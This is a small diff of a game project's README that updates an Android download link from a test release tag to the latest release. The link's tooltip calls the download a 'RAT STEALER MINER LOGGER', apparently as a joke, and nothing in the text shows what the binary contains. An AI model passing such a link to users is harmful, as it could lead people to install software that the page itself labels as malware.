@@ -2,7 +2,7 @@
 =:7)~~⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 
 ## [PLAY NOW (web version)](https://halobomb.github.io/monster/game/ "click to play")
-[Download (android)](https://github.com/halobomb/monster/releases/tag/v0.2-test/ "yes this RAT STEALER MINER LOGGER")
+[Download (android)](https://github.com/halobomb/monster/releases/latest/ "yes this RAT STEALER MINER LOGGER")
 ### requirements:
 - `WebGL`
 ---
